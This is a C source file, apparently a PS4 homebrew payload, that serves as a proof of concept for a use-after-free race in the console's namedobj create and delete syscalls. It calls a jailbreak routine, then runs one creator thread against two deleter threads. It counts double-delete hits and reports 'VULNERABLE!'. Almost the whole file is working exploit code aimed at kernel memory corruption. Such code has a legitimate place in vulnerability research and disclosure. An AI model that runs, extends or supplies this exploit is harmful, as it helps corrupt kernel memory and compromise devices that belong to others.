#include "ps4.h"

#define SYS_NAMEDOBJ_CREATE 557
#define SYS_NAMEDOBJ_DELETE 558
#define NAMEDOBJ_FLAGS 0x107

static int namedobj_create(const char* name,
                            int data,
                            uint32_t flags) {
    return syscall(SYS_NAMEDOBJ_CREATE, name, data, flags);
}

static int namedobj_delete(uint32_t handle,
                            uint16_t flags) {
    return syscall(SYS_NAMEDOBJ_DELETE, handle, flags);
}

static volatile int g_handle  = -1;
static volatile int g_running =  1;
static volatile int g_hits    =  0;
static volatile int g_count   =  0;

void* thread_delete_a(void* arg) {
    printf_debug("thread_A start\n");
    while (g_running) {
        int h = g_handle;
        if (h == -1) continue;
        g_handle = -1;
        int r = namedobj_delete(h, NAMEDOBJ_FLAGS);
        printf_debug("A: h=0x%x r=%d\n", h, r);
    }
    return NULL;
}

void* thread_delete_b(void* arg) {
    printf_debug("thread_B start\n");
    while (g_running) {
        int h = g_handle;
        if (h == -1) continue;
        int r = namedobj_delete(h, NAMEDOBJ_FLAGS);
        if (r == 0) {
            g_hits++;
            printf_debug("[!!!] UAF HIT #%d h=0x%x\n", g_hits, h);
        }
    }
    return NULL;
}

void* thread_create(void* arg) {
    printf_debug("thread_C start\n");
    while (g_running) {

        // أنشئ object جديد مباشرة
        int h = namedobj_create("poc_uaf", 0, NAMEDOBJ_FLAGS);

        if (h <= 0) {
            sceKernelUsleep(100);
            continue;
        }

        g_count++;
        printf_debug("C: create #%d h=0x%x\n", g_count, h);

        // ضع الـ handle مباشرة — thread_A سيأخذه
        g_handle = h;

        // sleep قصير فقط لإعطاء thread_A فرصة
        sceKernelUsleep(10);
    }
    return NULL;
}

int _main(struct thread *td) {
    UNUSED(td);

    initKernel();
    initLibc();
    initPthread();
    initNetwork();
    jailbreak();
    initSysUtil();

    ScePthread tA, tB, tC;

    printf_debug("=== namedobj UAF PoC ===\n");
    printf_debug("Bug: entry[0x10] zeroed outside lock\n\n");

    scePthreadCreate(&tC, NULL, thread_create,    NULL, "creator");
    scePthreadCreate(&tA, NULL, thread_delete_a,  NULL, "deleter_a");
    scePthreadCreate(&tB, NULL, thread_delete_b,  NULL, "deleter_b");

    sceKernelSleep(30);
    g_running = 0;

    scePthreadJoin(tA, NULL);
    scePthreadJoin(tB, NULL);
    scePthreadJoin(tC, NULL);

    printf_debug("\n=== Results ===\n");
    printf_debug("Total creates: %d\n", g_count);
    printf_debug("UAF hits: %d\n", g_hits);

    if (g_hits > 0) {
        printf_debug("[+] VULNERABLE!\n");
    } else {
        printf_debug("[-] No hits\n");
    }

    return 0;
}